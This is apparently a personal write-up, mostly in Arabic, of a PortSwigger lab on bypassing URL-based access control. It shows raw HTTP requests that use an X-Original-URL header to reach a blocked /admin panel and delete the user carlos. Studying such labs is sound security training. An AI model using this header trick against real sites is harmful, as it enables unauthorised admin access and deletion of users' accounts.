## 🎯  [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

### 📝 الوصف
يوجد لوحة تحكم المدير على مسار `/admin` ولكن تم حظر الوصول إليه من خلال نظام front-end. مع ذلك، التطبيق يدعم header خاص اسمه `X-Original-URL` يمكنه تجاوز هذا الحظر.

### 🎯 الهدف
الوصول إلى لوحة التحكم وحذف المستخدم `carlos`

---

### 🔍 الاكتشاف والتحليل

### ❌ المحاولة الأولية:
1. ذهبت مباشرة إلى `/admin` → **حظر 404**
2. جربت `/admin/` → **نفس النتيجة**

### 💡 الملاحظة المهمة:
- النظام يستخدم framework يدعم `X-Original-URL` header
- هذا الheader يستخدم لتجاوز مسار الطلب الأصلي

---

### 🛠️ خطوات الحل التفصيلية
#### Step 1: Using Burp Suite
![[photo/Screenshot From 2025-10-17 12-52-42.png]]
```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /admin
```

<mark style="background: #BBFABBA6;">2 نروح علي Repeater  و نضيف  x-orginal-URL: /admin </mark>
![[photo/Screenshot From 2025-10-17 13-02-42.png]]
#### Step 2: Access Admin Panel
1. Send request with <mark style="background: #FF5582A6;">X-Original-URL</mark> header:
	```http 
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Original-URL: /admin
```
	- Response shows admin panel interface
	- Contains option to delete users

#### Step 3: Delete Carlos User

![[photo/Screenshot From 2025-10-17 13-39-40.png]]
1. Send delete request using header bypass:
	```http
GET /?username=carlos HTTP/2

Host: 0ad700bf03a36103821bf166008900a3.web-security-academy.net
Cookie: session=mGA7P7tE0gJi6oLUNJDJs7VseOO5CLx5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad700bf03a36103821bf166008900a3.web-security-academy.net/

X-Original-Url: /admin/delete

Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
---

